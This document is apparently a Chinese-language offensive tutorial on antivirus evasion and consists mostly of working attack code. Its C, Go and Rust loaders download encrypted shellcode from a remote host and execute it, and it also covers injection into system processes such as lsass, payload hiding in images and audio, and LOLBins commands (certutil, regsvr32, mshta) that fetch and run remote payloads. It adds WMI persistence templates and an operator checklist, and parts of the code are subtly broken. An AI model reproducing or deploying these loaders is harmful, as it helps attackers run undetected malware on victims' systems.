# 静态免杀 (Static Evasion)

## Shellcode加载器

### 分离免杀 (Loader + Payload)

#### 基础分离加载器
```c
// loader.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 从远程服务器下载payload
unsigned char* download_payload(const char* url, size_t* payload_size) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) return NULL;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    // 获取文件大小
    DWORD file_size = 0;
    DWORD buffer_size = sizeof(file_size);
    if (!HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &file_size, &buffer_size, NULL)) {
        file_size = 0;
    }
    
    // 分配内存并下载
    unsigned char* buffer = (unsigned char*)malloc(file_size);
    if (buffer == NULL) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }
    
    DWORD total_read = 0;
    DWORD bytes_read;
    while (InternetReadFile(hUrl, buffer + total_read, 4096, &bytes_read) && bytes_read > 0) {
        total_read += bytes_read;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    *payload_size = total_read;
    return buffer;
}

// 执行shellcode
void execute_shellcode(unsigned char* shellcode, size_t size) {
    // 分配可执行内存
    void* exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        free(shellcode);
        return;
    }
    
    // 复制shellcode到可执行内存
    memcpy(exec_mem, shellcode, size);
    
    // 执行shellcode
    ((void(*)())exec_mem)();
    
    // 清理
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(shellcode);
}

int main() {
    const char* payload_url = "http://192.168.1.100:8080/payload.bin";
    size_t payload_size;
    
    // 下载payload
    unsigned char* payload = download_payload(payload_url, &payload_size);
    if (payload == NULL) {
        printf("Failed to download payload\n");
        return 1;
    }
    
    printf("Downloaded %zu bytes of payload\n", payload_size);
    
    // 执行payload
    execute_shellcode(payload, payload_size);
    
    return 0;
}
```

#### 高级分离加载器
```c
// advanced_loader.c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")

// XOR解密
void xor_decrypt(unsigned char* data, size_t size, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_len];
    }
}

// 从PNG文件中提取隐藏的数据
unsigned char* extract_from_png(const char* png_path, size_t* extracted_size) {
    FILE* file = fopen(png_path, "rb");
    if (file == NULL) return NULL;
    
    // 查找PNG文件末尾的隐藏数据
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    
    // 查找IEND chunk (89 50 4E 47 AE 42 60 82)
    unsigned char iend_marker[] = {0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82};
    unsigned char buffer[8];
    
    // 从文件末尾向前搜索IEND
    for (long i = file_size - 8; i >= 0; i--) {
        fseek(file, i, SEEK_SET);
        fread(buffer, 1, 8, file);
        
        if (memcmp(buffer, iend_marker, 8) == 0) {
            // 找到IEND，提取后面的数据
            long data_start = i + 8;
            long data_size = file_size - data_start;
            
            unsigned char* extracted_data = (unsigned char*)malloc(data_size);
            if (extracted_data) {
                fseek(file, data_start, SEEK_SET);
                fread(extracted_data, 1, data_size, file);
                *extracted_size = data_size;
                fclose(file);
                return extracted_data;
            }
        }
    }
    
    fclose(file);
    return NULL;
}

// 进程注入技术
BOOL inject_into_process(DWORD pid, unsigned char* shellcode, size_t shellcode_size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) return FALSE;
    
    // 在目标进程中分配内存
    void* remote_mem = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 写入shellcode
    if (!WriteProcessMemory(hProcess, remote_mem, shellcode, shellcode_size, NULL)) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 创建远程线程执行shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 等待线程执行
    WaitForSingleObject(hThread, INFINITE);
    
    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// 使用系统进程注入
void execute_via_system_process() {
    // 常见系统进程
    const char* system_processes[] = {
        "svchost.exe",
        "explorer.exe",
        "services.exe",
        "lsass.exe",
        "winlogon.exe"
    };
    
    // 查找系统进程
    DWORD system_pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < sizeof(system_processes) / sizeof(system_processes[0]); i++) {
                    if (_stricmp(pe32.szExeFile, system_processes[i]) == 0) {
                        system_pid = pe32.th32ProcessID;
                        break;
                    }
                }
                if (system_pid != 0) break;
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    if (system_pid != 0) {
        // 从PNG提取shellcode
        size_t shellcode_size;
        unsigned char* shellcode = extract_from_png("image.png", &shellcode_size);
        
        if (shellcode) {
            // 解密shellcode
            xor_decrypt(shellcode, shellcode_size, "MySecretKey123");
            
            // 注入到系统进程
            if (inject_into_process(system_pid, shellcode, shellcode_size)) {
                printf("Successfully injected into system process PID: %d\n", system_pid);
            }
            
            free(shellcode);
        }
    }
}

int main() {
    execute_via_system_process();
    return 0;
}
```

### 异或/AES加密

#### 异或加密实现
```c
// xor_encryption.c
#include <windows.h>
#include <stdio.h>

// 多轮异或加密
void multi_round_xor(unsigned char* data, size_t size, const char* key, int rounds) {
    size_t key_len = strlen(key);
    
    for (int r = 0; r < rounds; r++) {
        for (size_t i = 0; i < size; i++) {
            data[i] ^= key[(i + r) % key_len];
            data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;  // 位旋转
        }
    }
}

// 动态密钥生成
void generate_dynamic_key(const char* base_key, unsigned char* output_key, size_t key_size) {
    // 使用系统信息生成动态密钥
    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);
    
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    
    // 组合系统信息
    char system_info[256];
    sprintf(system_info, "%d%d%d%d", 
            sys_info.dwNumberOfProcessors,
            mem_status.ullTotalPhys,
            GetTickCount(),
            GetCurrentProcessId());
    
    // 生成密钥
    for (size_t i = 0; i < key_size; i++) {
        output_key[i] = (base_key[i % strlen(base_key)] ^ system_info[i % strlen(system_info)]) & 0xFF;
    }
}

// 时间基加密
void time_based_encryption(unsigned char* data, size_t size) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    
    // 使用当前时间作为密钥的一部分
    DWORD time_key = (st.wHour << 24) | (st.wMinute << 16) | (st.wSecond << 8) | st.wMilliseconds;
    
    for (size_t i = 0; i < size; i++) {
        data[i] ^= (time_key >> (i % 32)) & 0xFF;
        data[i] ^= st.wDayOfWeek * i;
    }
}
```

#### AES加密实现
```c
// aes_encryption.c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

// AES加密函数
BOOL aes_encrypt(unsigned char* data, DWORD data_size, unsigned char* key, DWORD key_size, unsigned char** encrypted_data, DWORD* encrypted_size) {
    HCRYPTPROV hProvider = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    
    // 获取加密服务提供者
    if (!CryptAcquireContext(&hProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // 创建哈希对象
    if (!CryptCreateHash(hProvider, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 哈希密钥
    if (!CryptHashData(hHash, key, key_size, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 生成AES密钥
    if (!CryptDeriveKey(hProvider, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 分配内存用于加密数据
    *encrypted_data = (unsigned char*)malloc(data_size);
    if (*encrypted_data == NULL) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 复制数据
    memcpy(*encrypted_data, data, data_size);
    *encrypted_size = data_size;
    
    // 加密数据
    if (!CryptEncrypt(hKey, 0, TRUE, 0, *encrypted_data, encrypted_size, data_size)) {
        free(*encrypted_data);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 清理
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProvider, 0);
    
    return TRUE;
}

// AES解密函数
BOOL aes_decrypt(unsigned char* encrypted_data, DWORD encrypted_size, unsigned char* key, DWORD key_size, unsigned char** decrypted_data, DWORD* decrypted_size) {
    HCRYPTPROV hProvider = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    
    // 获取加密服务提供者
    if (!CryptAcquireContext(&hProvider, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // 创建哈希对象
    if (!CryptCreateHash(hProvider, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 哈希密钥
    if (!CryptHashData(hHash, key, key_size, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 生成AES密钥
    if (!CryptDeriveKey(hProvider, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 分配内存用于解密数据
    *decrypted_data = (unsigned char*)malloc(encrypted_size);
    if (*decrypted_data == NULL) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 复制加密数据
    memcpy(*decrypted_data, encrypted_data, encrypted_size);
    *decrypted_size = encrypted_size;
    
    // 解密数据
    if (!CryptDecrypt(hKey, 0, TRUE, 0, *decrypted_data, decrypted_size)) {
        free(*decrypted_data);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProvider, 0);
        return FALSE;
    }
    
    // 清理
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProvider, 0);
    
    return TRUE;
}
```

### 隐写术 (图片/音频藏码)

#### 图片隐写
```python
# image_steganography.py
from PIL import Image
import numpy as np
import base64
import os

class ImageSteganography:
    def __init__(self):
        pass
    
    def embed_payload_in_image(self, image_path, payload_data, output_path):
        """将payload嵌入图片"""
        # 打开图片
        img = Image.open(image_path)
        pixels = np.array(img)
        
        # 将payload转换为二进制
        payload_binary = ''.join(format(byte, '08b') for byte in payload_data)
        payload_len = len(payload_binary)
        
        # 在图片中嵌入payload长度（前32位）
        len_binary = format(payload_len, '032b')
        
        # 合并长度和payload
        full_binary = len_binary + payload_binary
        
        # 检查图片是否有足够的容量
        height, width, channels = pixels.shape
        max_capacity = height * width * channels * 3  # 使用每个颜色通道的最低3位
        
        if len(full_binary) > max_capacity:
            raise ValueError("Image too small for payload")
        
        # 嵌入数据
        data_index = 0
        for i in range(height):
            for j in range(width):
                for k in range(channels):
                    if data_index < len(full_binary):
                        # 修改最低位
                        pixel_value = pixels[i][j][k]
                        pixel_value = (pixel_value & ~1) | int(full_binary[data_index])
                        pixels[i][j][k] = pixel_value
                        data_index += 1
                    else:
                        break
                if data_index >= len(full_binary):
                    break
            if data_index >= len(full_binary):
                break
        
        # 保存修改后的图片
        new_img = Image.fromarray(pixels.astype(np.uint8))
        new_img.save(output_path)
        
        return True
    
    def extract_payload_from_image(self, image_path):
        """从图片中提取payload"""
        img = Image.open(image_path)
        pixels = np.array(img)
        
        height, width, channels = pixels.shape
        
        # 提取长度信息（前32位）
        len_binary = ""
        data_index = 0
        
        for i in range(height):
            for j in range(width):
                for k in range(channels):
                    if data_index < 32:
                        len_binary += str(pixels[i][j][k] & 1)
                        data_index += 1
                    else:
                        break
                if data_index >= 32:
                    break
            if data_index >= 32:
                break
        
        # 转换长度为整数
        payload_len = int(len_binary, 2)
        
        # 提取payload
        payload_binary = ""
        data_index = 32
        
        for i in range(height):
            for j in range(width):
                for k in range(channels):
                    if data_index < 32 + payload_len:
                        payload_binary += str(pixels[i][j][k] & 1)
                        data_index += 1
                    else:
                        break
                if data_index >= 32 + payload_len:
                    break
            if data_index >= 32 + payload_len:
                break
        
        # 转换二进制为字节
        payload_bytes = bytearray()
        for i in range(0, len(payload_binary), 8):
            byte = payload_binary[i:i+8]
            payload_bytes.append(int(byte, 2))
        
        return bytes(payload_bytes)

# 使用示例
stego = ImageSteganography()

# 要隐藏的payload（例如，shellcode）
payload = b"\x90" * 100 + b"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"

# 嵌入到图片
stego.embed_payload_in_image("normal_image.png", payload, "steganographed_image.png")

# 从图片中提取
extracted_payload = stego.extract_payload_from_image("steganographed_image.png")
print(f"Extracted payload size: {len(extracted_payload)} bytes")
```

#### 音频隐写
```python
# audio_steganography.py
import wave
import numpy as np
import struct

class AudioSteganography:
    def __init__(self):
        pass
    
    def embed_payload_in_wav(self, audio_path, payload_data, output_path):
        """将payload嵌入WAV音频文件"""
        # 打开音频文件
        with wave.open(audio_path, 'rb') as audio:
            params = audio.getparams()
            frames = audio.readframes(audio.getnframes())
            
            # 将音频数据转换为numpy数组
            audio_array = np.frombuffer(frames, dtype=np.int16)
            
            # 将payload转换为二进制
            payload_binary = ''.join(format(byte, '08b') for byte in payload_data)
            payload_len = len(payload_binary)
            
            # 在音频中嵌入payload长度（前32位）
            len_binary = format(payload_len, '032b')
            full_binary = len_binary + payload_binary
            
            # 检查音频是否有足够的容量
            if len(full_binary) > len(audio_array):
                raise ValueError("Audio too small for payload")
            
            # 使用LSB隐写术嵌入数据
            for i, bit in enumerate(full_binary):
                # 修改最低位
                audio_array[i] = (audio_array[i] & ~1) | int(bit)
            
            # 保存修改后的音频
            with wave.open(output_path, 'wb') as output_audio:
                output_audio.setparams(params)
                output_audio.writeframes(audio_array.astype(np.int16).tobytes())
        
        return True
    
    def extract_payload_from_wav(self, audio_path):
        """从WAV音频文件中提取payload"""
        with wave.open(audio_path, 'rb') as audio:
            frames = audio.readframes(audio.getnframes())
            audio_array = np.frombuffer(frames, dtype=np.int16)
            
            # 提取长度信息（前32位）
            len_binary = ""
            for i in range(32):
                len_binary += str(audio_array[i] & 1)
            
            payload_len = int(len_binary, 2)
            
            # 提取payload
            payload_binary = ""
            for i in range(32, 32 + payload_len):
                payload_binary += str(audio_array[i] & 1)
            
            # 转换二进制为字节
            payload_bytes = bytearray()
            for i in range(0, len(payload_binary), 8):
                byte = payload_binary[i:i+8]
                payload_bytes.append(int(byte, 2))
            
            return bytes(payload_bytes)

# 使用示例
audio_stego = AudioSteganography()

# 要隐藏的payload
shellcode = b"\x90" * 50 + b"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"

# 嵌入到音频文件
audio_stego.embed_payload_in_wav("normal_audio.wav", shellcode, "steganographed_audio.wav")

# 从音频文件中提取
extracted_shellcode = audio_stego.extract_payload_from_wav("steganographed_audio.wav")
print(f"Extracted shellcode size: {len(extracted_shellcode)} bytes")
```

---

## 源码级混淆

### Go/Rust混淆

#### Go代码混淆
```go
// obfuscated_loader.go
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "syscall"
    "unsafe"
)

// 动态字符串构建
func buildString(parts []string) string {
    result := ""
    for _, part := range parts {
        result += part
    }
    return result
}

// 字符串反转
func reverseString(s string) string {
    runes := []rune(s)
    for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
        runes[i], runes[j] = runes[j], runes[i]
    }
    return string(runes)
}

// 异或解密
func xorDecrypt(data []byte, key string) []byte {
    keyLen := len(key)
    result := make([]byte, len(data))
    
    for i := 0; i < len(data); i++ {
        result[i] = data[i] ^ key[i%keyLen]
    }
    
    return result
}

// 从URL下载数据
func downloadData(url string) ([]byte, error) {
    resp, err := http.Get(url)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    return ioutil.ReadAll(resp.Body)
}

// AES解密
func aesDecrypt(encryptedData []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    
    if len(encryptedData) < aes.BlockSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    
    iv := encryptedData[:aes.BlockSize]
    encryptedData = encryptedData[aes.BlockSize:]
    
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(encryptedData, encryptedData)
    
    return encryptedData, nil
}

// 执行shellcode
func executeShellcode(shellcode []byte) error {
    // 使用Windows API分配可执行内存
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    virtualProtect := kernel32.NewProc("VirtualProtect")
    rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    createThread := kernel32.NewProc("CreateThread")
    waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    // 分配内存
    addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)),
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_READWRITE)
    
    if addr == 0 {
        return fmt.Errorf("VirtualAlloc failed: %v", err)
    }
    
    // 复制shellcode
    rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    // 修改内存保护
    var oldProtect uint32
    virtualProtect.Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 创建线程执行shellcode
    thread, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
    if thread == 0 {
        return fmt.Errorf("CreateThread failed: %v", err)
    }
    
    // 等待线程完成
    waitForSingleObject.Call(thread, syscall.INFINITE)
    
    return nil
}

func main() {
    // 混淆的URL
    urlParts := []string{
        "http://",
        "192.168.1.100",
        ":8080/",
        "payload.bin"
    }
    
    url := buildString(urlParts)
    
    // 下载加密的数据
    encryptedData, err := downloadData(url)
    if err != nil {
        fmt.Printf("Failed to download data: %v\n", err)
        os.Exit(1)
    }
    
    // 解密数据
    key := []byte("MySecretKey1234567890123456") // 32字节AES密钥
    shellcode, err := aesDecrypt(encryptedData, key)
    if err != nil {
        fmt.Printf("Failed to decrypt data: %v\n", err)
        os.Exit(1)
    }
    
    // 执行shellcode
    if err := executeShellcode(shellcode); err != nil {
        fmt.Printf("Failed to execute shellcode: %v\n", err)
        os.Exit(1)
    }
}
```

#### Rust代码混淆
```rust
// obfuscated_loader.rs
use std::ptr;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use winapi::shared::minwindef::{DWORD, LPVOID};
use reqwest;
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use base64;

// 定义AES类型
type Aes256Cbc = Cbc<Aes256, Pkcs7>;

// 字符串混淆宏
macro_rules! obfuscated_string {
    ($s:expr) => {{
        let s = $s;
        let mut result = String::new();
        for (i, c) in s.chars().enumerate() {
            result.push((c as u8 ^ (i as u8)) as char);
        }
        result
    }};
}

// 异或解密
fn xor_decrypt(data: &mut [u8], key: &str) {
    let key_bytes = key.as_bytes();
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key_bytes[i % key_bytes.len()];
    }
}

// 从URL下载数据
async fn download_data(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let response = reqwest::get(url).await?;
    let data = response.bytes().await?;
    Ok(data.to_vec())
}

// AES解密
fn decrypt_data(encrypted_data: &[u8], key: &[u8], iv: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cipher = Aes256Cbc::new_from_slices(key, iv)?;
    let decrypted_data = cipher.decrypt_vec(encrypted_data)?;
    Ok(decrypted_data)
}

// 执行shellcode
unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // 分配可执行内存
    let exec_mem = VirtualAlloc(
        ptr::null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if exec_mem.is_null() {
        return Err("VirtualAlloc failed".into());
    }
    
    // 复制shellcode
    ptr::copy_nonoverlapping(shellcode.as_ptr(), exec_mem as *mut u8, shellcode.len());
    
    // 修改内存保护
    let mut old_protect = 0;
    let result = VirtualProtect(
        exec_mem,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect
    );
    
    if result == 0 {
        return Err("VirtualProtect failed".into());
    }
    
    // 创建线程执行shellcode
    let mut thread_id = 0;
    let thread = CreateThread(
        ptr::null_mut(),
        0,
        Some(std::mem::transmute(exec_mem as *const ())),
        ptr::null_mut(),
        0,
        &mut thread_id
    );
    
    if thread.is_null() {
        return Err("CreateThread failed".into());
    }
    
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 混淆的URL
    let url_parts = vec![
        obfuscated_string!("http://"),
        obfuscated_string!("192.168.1.100"),
        obfuscated_string!(":8080/"),
        obfuscated_string!("payload.bin")
    ];
    
    let url = url_parts.join("");
    
    // 下载加密数据
    let encrypted_data = download_data(&url).await?;
    
    // 解密数据
    let key = b"MySecretKey1234567890123456"; // 32字节AES密钥
    let iv = b"1234567890123456"; // 16字节IV
    let shellcode = decrypt_data(&encrypted_data, key, iv)?;
    
    // 执行shellcode
    unsafe {
        execute_shellcode(&shellcode)?;
    }
    
    Ok(())
}
```

### 签名伪造与白名单利用 (LOLBins)

#### 签名伪造
```c
// signature_forgery.c
#include <windows.h>
#include <wintrust.h>
#include <softpub.h>
#include <cryptdlg.h>
#include <stdio.h>

#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "cryptdlg.lib")

// 伪造数字签名
BOOL forge_digital_signature(const char* target_file, const char* legitimate_file) {
    // 读取合法文件的证书
    WINTRUST_FILE_INFO file_info = {0};
    file_info.cbStruct = sizeof(WINTRUST_FILE_INFO);
    file_info.pcwszFilePath = (LPCWSTR)legitimate_file;
    
    WINTRUST_DATA trust_data = {0};
    trust_data.cbStruct = sizeof(WINTRUST_DATA);
    trust_data.dwUIChoice = WTD_UI_NONE;
    trust_data.fdwRevocationChecks = WTD_REVOKE_NONE;
    trust_data.dwUnionChoice = WTD_CHOICE_FILE;
    trust_data.pFile = &file_info;
    trust_data.dwStateAction = WTD_STATEACTION_VERIFY;
    
    // 验证合法文件的签名
    LONG result = WinVerifyTrust(NULL, &WINTRUST_ACTION_GENERIC_VERIFY_V2, &trust_data);
    
    if (result == ERROR_SUCCESS) {
        // 获取证书信息
        CRYPT_PROVIDER_DATA* prov_data = (CRYPT_PROVIDER_DATA*)trust_data.hWVTStateData;
        if (prov_data && prov_data->psPfns && prov_data->psPfns->pfnAlloc) {
            // 这里可以实现证书复制逻辑
            printf("[+] Legitimate file certificate verified\n");
        }
    }
    
    trust_data.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &WINTRUST_ACTION_GENERIC_VERIFY_V2, &trust_data);
    
    return (result == ERROR_SUCCESS);
}
```

#### LOLBins利用
```powershell
# lolbins_exploitation.ps1

# 使用certutil下载文件
certutil -urlcache -split -f http://192.168.1.100:8080/payload.exe C:\Windows\Temp\update.exe

# 使用rundll32执行DLL
rundll32.exe C:\Windows\Temp\malicious.dll,EntryPoint

# 使用regsvr32执行脚本
regsvr32.exe /s /n /u /i:http://192.168.1.100:8080/payload.sct scrobj.dll

# 使用mshta执行HTML应用
mshta.exe http://192.168.1.100:8080/payload.hta

# 使用forfiles执行命令
forfiles /p c:\windows\system32 /m cmd.exe /c "C:\Windows\Temp\update.exe"

# 使用wmic执行命令
wmic process call create "C:\Windows\Temp\update.exe"
```

#### 高级LOLBins脚本
```python
# lolbins_generator.py
import base64
import random

class LOLBinsGenerator:
    def __init__(self):
        self.lolbins = {
            'certutil': {
                'download': 'certutil -urlcache -split -f {url} {output}',
                'encode': 'certutil -encode {input} {output}',
                'decode': 'certutil -decode {input} {output}'
            },
            'rundll32': {
                'execute': 'rundll32.exe {dll},{entry_point}',
                'javascript': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "+document.write();GetObject("script:{url}")"
            },
            'regsvr32': {
                'remote': 'regsvr32.exe /s /n /u /i:{url} scrobj.dll',
                'local': 'regsvr32.exe /s {dll}'
            },
            'mshta': {
                'remote': 'mshta.exe {url}',
                'inline': 'mshta.exe javascript:eval("{encoded_js}")'
            },
            'wmic': {
                'process': 'wmic process call create "{command}"',
                'os': 'wmic os get /format:"{url}"'
            }
        }
    
    def generate_certutil_payload(self, payload_url, output_path):
        """生成certutil payload"""
        commands = [
            # 下载payload
            f'certutil -urlcache -split -f {payload_url} {output_path}',
            # 执行payload
            f'start {output_path}',
            # 清理缓存
            f'certutil -urlcache -split -f {payload_url} delete'
        ]
        return commands
    
    def generate_rundll32_javascript(self, payload_url):
        """生成rundll32 JavaScript payload"""
        js_code = f'''
        var obj = GetObject("script:{payload_url}");
        obj.Exec();
        '''
        
        # 压缩和混淆JavaScript
        compressed_js = js_code.replace('\n', '').replace(' ', '')
        encoded_js = base64.b64encode(compressed_js.encode()).decode()
        
        command = f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "+document.write();GetObject("script:{payload_url}")'
        
        return command
    
    def generate_regsvr32_sct(self, payload_url):
        """生成regsvr32 SCT payload"""
        sct_content = f'''<?XML version="1.0"?>
<scriptlet>
<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{{AAAA1111-0000-0000-0000-0000FEEDACDC}}"
    remotable="true">
</registration>
<script language="JScript">
<![CDATA[
    var obj = GetObject("script:{payload_url}");
    obj.Exec();
]]>
</script>
</scriptlet>'''
        
        return sct_content
    
    def generate_mshta_inline(self, command):
        """生成mshta内联payload"""
        # 创建JavaScript代码
        js_code = f'''
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run("{command}", 0, false);
        window.close();
        '''
        
        # 压缩和编码
        compressed_js = js_code.replace('\n', '').replace('  ', '')
        encoded_js = base64.b64encode(compressed_js.encode()).decode()
        
        command = f'mshta.exe javascript:eval("{encoded_js}")'
        
        return command
    
    def generate_wmic_payload(self, command):
        """生成WMIC payload"""
        # 创建MOF文件内容
        mof_content = f'''
#pragma namespace("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filt
{{
    Name = "EventFilter";
    EventNamespace = "root\\\\cimv2";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320";
    QueryLanguage = "WQL";
}};

instance of ActiveScriptEventConsumer as $Cons
{{
    Name = "ActiveScriptEventConsumer";
    ScriptingEngine = "JScript";
    ScriptText = "var WSH = new ActiveXObject('WScript.Shell'); WSH.Run('{command}');";
}};

instance of __FilterToConsumerBinding
{{
    Filter = $Filt;
    Consumer = $Cons;
}};
'''
        
        return mof_content

# 使用示例
generator = LOLBinsGenerator()

# 生成certutil payload
certutil_commands = generator.generate_certutil_payload(
    "http://192.168.1.100:8080/payload.exe",
    "C:\\Windows\\Temp\\update.exe"
)

print("Certutil Payload:")
for cmd in certutil_commands:
    print(f"  {cmd}")

# 生成rundll32 payload
rundll32_cmd = generator.generate_rundll32_javascript("http://192.168.1.100:8080/payload.js")
print(f"\nRundll32 Payload: {rundll32_cmd}")
```

---

## 实战检查清单

### Shellcode加载器
- [ ] 分离加载器已编写
- [ ] Payload已加密存储
- [ ] 进程注入技术已选择
- [ ] 内存分配策略已确定
- [ ] 清理机制已实现

### 加密技术
- [ ] 异或加密已配置
- [ ] AES加密密钥已生成
- [ ] 动态密钥算法已实现
- [ ] 时间基加密已设置
- [ ] 解密逻辑已测试

### 隐写术
- [ ] 图片隐写算法已实现
- [ ] 音频隐写已配置
- [ ] 数据嵌入容量已计算
